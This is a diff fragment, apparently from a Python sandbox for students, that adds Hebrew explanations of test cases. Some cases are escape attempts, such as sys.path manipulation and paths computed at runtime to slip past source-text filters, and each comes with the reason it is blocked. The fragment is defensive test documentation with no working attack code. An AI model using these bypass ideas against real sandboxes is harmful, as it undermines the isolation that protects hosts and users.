+      בדיקת מבנה הקוד חייבת לחסום אותה. שתי ההגנות משלימות זו את זו:
+      אחת מגבילה נתיבים והשנייה מונעת עקיפה שלה.
+    `,
+  "Python: sys.path manipulation": `
+      🎯 מתקפה: הרחבת נתיב הייבוא
+
+      הוספה ל־sys.path מאפשרת לתוכנית לייבא קוד מכל מקום במכולה,
+      כולל מודול שהיא כתבה בעצמה רגע קודם.
+
+      למה זה חסום:
+      מאותה סיבה ש־sys.modules חסום: המערכת מאפשרת רק רשימה מוגדרת
+      של מאפייני sys, והמאפיין הזה אינו ברשימה.
+    `,
+  "Python: workspace file I/O is allowed": `
+      ✅ זו אינה מתקפה — וזה המקרה שהוביל לשינוי כולו.
+
+      קריאה וכתיבה של קבצים בתוך הפרויקט של התלמיד הן נושא לימודי
+      רגיל. בעבר open() נחסמה לגמרי, ולכן אי אפשר היה לתת תרגיל כמו
+      "קראו קובץ וספרו את המילים".
+
+      ההתנהגות הזאת חייבת להמשיך לעבוד. נסיגה כאן אינה שיפור אבטחה
+      אלא אובדן של יכולת לימודית, ולכן היא נבדקת לצד ניסיונות התקיפה.
+    `,
+  "Python: a computed path outside the workspace": `
+      🎯 מתקפה: בניית נתיב באופן שמסנן טקסט אינו יכול לזהות
+
+      המחרוזת המלאה של הנתיב האסור אינה מופיעה בקוד. לכן מסנן שבודק
+      רק את טקסט המקור אינו יכול לזהות את הבקשה מראש.
+
+      למה זה נחסם:
+      ההגנה בודקת את הנתיב שהתוכנית מבקשת בפועל, אחרי שהוא חושב
+      ונפתר. המקרה הזה מדגים מדוע הגבלת נתיבים החליפה חסימה גורפת.
+    `,
+});
